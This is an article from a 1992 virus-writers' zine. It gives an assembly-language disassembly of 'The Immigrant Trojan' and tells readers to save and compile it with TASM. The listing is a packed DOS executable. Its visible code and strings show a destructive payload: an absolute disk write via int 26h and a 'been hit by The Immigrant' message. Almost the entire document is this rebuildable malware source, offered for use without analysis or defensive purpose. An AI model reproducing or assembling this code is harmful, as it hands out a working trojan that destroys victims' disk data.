ФФФФФФФФФЭЭЭЭЭЭЭЭЭ>>> Article From Evolution #1 - YAM '92

Article Title: The Immigrant Trojan Disassembly
Author: Natas Kaupas


;*****************************************************************************
; Dissasembly of The Immigrant Trojan (TIT)
; Dissasembly by Dark Angel
;
; Just save this and compile it with TASM.
;*****************************************************************************
  
PAGE  59,132
  
data_6e           equ     2000h                   ; (0010:2000=89h)
data_8e           equ     0Ch                     ; (8096:000C=0)
data_10e  equ     87F8h                   ; (8096:87F8=0)
data_11e  equ     0CDF3h                  ; (8096:CDF3=0)
  
; Tasm 1.00 will output   an extra NOP (90h) on forward memory references
; if the segment is declared after the reference.  Segments are   declared
; prior to any code to allow re-assembly.
  
seg_B             segment byte public
seg_B             ends
  
seg_C             segment byte public
seg_C             ends
  
  
;--------------------------------------------------------------   seg_a  ----
  
seg_a             segment byte public
          assume cs:seg_a , ds:seg_a , ss:stack_seg_c
  
          db      0FDh,0FFh, 00h,0FFh,0F8h, 0Eh
          db      0B8h, 05h, 00h, 8Eh,0D8h,0BDh
          db       01h, 00h,0BAh, 0Dh, 00h,0B4h
          db      0FFh,0FFh
          db      9
          db      0CDh, 21h, 80h, 3Eh, 0Ch, 00h
          db       1Ah, 7Dh, 19h,0B4h, 05h,0B5h
          db       00h,0B6h, 00h,0E1h, 79h, 8Ah
          db       16h,0F3h,0CDh, 13h,0BAh, 6Ah
          db      0E6h,0FEh, 06h,0F8h, 87h,0F3h
          db      0EBh,0E0h,0B0h, 02h
loc_2:
          mov     cx,2BCh
          mov     dx,0FFC9h
          stc                             ; Set carry flag
          mov     ds,[di+63h]
          mov     bx,[di+37h]
          int     26h                     ; Absolute disk write, drive al
          mov     dx,0E326h
          mov     ax,0F000h
          dec     word ptr [si-5]
          add     [bp+si],al
          or      ax,440Ah
          db       65h, 63h, 6Fh, 64h, 69h, 6Eh
          db      0FFh, 7Fh
          db      'g system files $'
          db      0F8h, 7Fh,0E7h
          db      'Ya', 27h, ' been hit'
          db      0F8h,0FFh,0F7h
          db      'y The Immigr'
          db      0E1h, 21h, 61h, 6Eh,0EFh, 54h
          db       72h, 6Fh, 6Ah,0F8h, 20h,0CEh
          db      0C3h,0C4h, 65h, 64h,0E2h, 6Fh
          db       78h,0C3h
          db      69h
  
locloop_3:
          jmp     bx                      ;*Register jump
          db      'a. [C.S.A.]'
          db      0BEh, 2Eh, 02h, 00h, 24h, 00h
          db      0F0h
          db      13 dup (0)
  
seg_a             ends
  
  
  
;--------------------------------------------------------------   seg_b  ----
  
seg_b             segment byte public
          assume cs:seg_b , ds:seg_b , ss:stack_seg_c
  
          db       10h, 00h
data_13           dw      0
data_14           dw      100h
data_15           dw      0Ch
data_16           dw      0Ch
data_17           dw      12h
data_18           dw      15Ch
  
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;
;                 Program Entry Point
;
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
  
  
tit              proc    far
  
start:
         push    es
         push    cs
         pop     ds
         mov     cx,data_18              ; (80B2:000C=15Ch)
         mov     si,cx
         dec     si
         mov     di,si
         mov     bx,ds
         add     bx,data_17              ; (80B2:000A=12h)
         mov     es,bx
         std                             ; Set direction flag
         rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
         push    bx
         mov     ax,2Bh
         push    ax
         retf
         mov     bp,cs:data_16           ; (80B2:0008=0Ch)
         mov     dx,ds
loc_6:
         mov     ax,bp
         cmp     ax,1000h
         jbe     loc_7                   ; Jump if below or =
         mov     ax,1000h
loc_7:
         sub     bp,ax
         sub     dx,ax
         sub     bx,ax
         mov     ds,dx
         mov     es,bx
         mov     cl,3
         shl     ax,cl                   ; Shift w/zeros fill
         mov     cx,ax
         shl     ax,1                    ; Shift w/zeros fill
         dec     ax
         dec     ax
         mov     si,ax
         mov     di,ax
         rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
         or      bp,bp                   ; Zero ?
         jnz     loc_6                   ; Jump if not zero
         cld                             ; Clear direction
         mov     es,dx
         mov     ds,bx
         xor     si,si                   ; Zero register
         xor     di,di                   ; Zero register
         mov     dx,10h
         lodsw                           ; String [si] to ax
         mov     bp,ax
loc_8:
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jnz     loc_9                   ; Jump if not zero
         lodsw                           ; String [si] to ax
         mov     bp,ax
         mov     dl,10h
loc_9:
         jnc     loc_10                  ; Jump if carry=0
         movsb                           ; Mov [si] to es:[di]
         jmp     short loc_8             ; (0069)
loc_10:
         xor     cx,cx                   ; Zero register
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jnz     loc_11                  ; Jump if not zero
         lodsw                           ; String [si] to ax
         mov     bp,ax
         mov     dl,10h
loc_11:
         jc      loc_14                  ; Jump if carry Set
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jnz     loc_12                  ; Jump if not zero
         lodsw                           ; String [si] to ax
         mov     bp,ax
         mov     dl,10h
loc_12:
         rcl     cx,1                    ; Rotate thru carry
         shr     bp,1                    ; Shift w/zeros fill
         dec     dx
         jnz     loc_13                  ; Jump if not zero
         lodsw                           ; String [si] to ax
         mov     bp,ax
         mov     dl,10h
loc_13:
         rcl     cx,1                    ; Rotate thru carry
         inc     cx
         inc     cx
         lodsb                           ; String [si] to al
         mov     bh,0FFh
         mov     bl,al
         jmp     locloop_15              ; (00BB)
loc_14:
         lodsw                           ; String [si] to ax
         mov     bx,ax
         mov     cl,3
         shr     bh,cl                   ; Shift w/zeros fill
         or      bh,0E0h
         and     ah,7
         jz      loc_16                  ; Jump if zero
         mov     cl,ah
         inc     cx
         inc     cx
  
locloop_15:
         mov     al,es:[bx+di]
         stosb                           ; Store al to es:[di]
         loop    locloop_15              ; Loop if cx > 0
  
         jmp     short loc_8             ; (0069)
loc_16:
         lodsb                           ; String [si] to al
         or      al,al                   ; Zero ?
         jz      loc_18                  ; Jump if zero
         cmp     al,1
         je      loc_17                  ; Jump if equal
         mov     cl,al
         inc     cx
         jmp     short locloop_15        ; (00BB)
loc_17:
         mov     bx,di
         and     di,0Fh
         add     di,data_6e              ; (0010:2000=89h)
         mov     cl,4
         shr     bx,cl                   ; Shift w/zeros fill
         mov     ax,es
         add     ax,bx
         sub     ax,200h
         mov     es,ax
         mov     bx,si
         and     si,0Fh
         shr     bx,cl                   ; Shift w/zeros fill
         mov     ax,ds
         add     ax,bx
         mov     ds,ax
         jmp     loc_8                   ; (0069)
         db       41h, 43h, 2Dh, 44h, 43h
loc_18:
         push    cs
         pop     ds
         mov     si,offset data_19       ; (80B2:0158=11h)
         pop     bx
         add     bx,10h
         mov     dx,bx
         xor     di,di                   ; Zero register
loc_19:
         lodsb                           ; String [si] to al
         or      al,al                   ; Zero ?
         jz      loc_21                  ; Jump if zero
         mov     ah,0
loc_20:
         add     di,ax
         mov     ax,di
         and     di,0Fh
         mov     cl,4
         shr     ax,cl                   ; Shift w/zeros fill
         add     dx,ax
         mov     es,dx
         add     es:[di],bx
         jmp     short loc_19            ; (0109)
loc_21:
         lodsw                           ; String [si] to ax
         or      ax,ax                   ; Zero ?
         jnz     loc_22                  ; Jump if not zero
         add     dx,0FFFh
         mov     es,dx
         jmp     short loc_19            ; (0109)
loc_22:
         cmp     ax,1
         jne     loc_20                  ; Jump if not equal
         mov     ax,bx
         mov     di,data_14              ; (80B2:0004=100h)
         mov     si,data_15              ; (80B2:0006=0Ch)
         add     si,ax
         add     data_13,ax              ; (80B2:0002=0)
         sub     ax,10h
         mov     ds,ax
         mov     es,ax
         xor     bx,bx                   ; Zero register
         cli                             ; Disable interrupts
         mov     ss,si
         mov     sp,di
         sti                             ; Enable interrupts
         jmp     dword ptr cs:[bx]       ;*
data_19          db      11h
         db      0, 1, 0
         db      292 dup (0)
  
tit              endp
  
seg_b            ends
  
  
  
;--------------------------------------------------------- stack_seg_c  ---
  
 stack_seg_c      segment word stack 'STACK'
  
         db      128 dup (0)
  
stack_seg_c      ends

         end     start


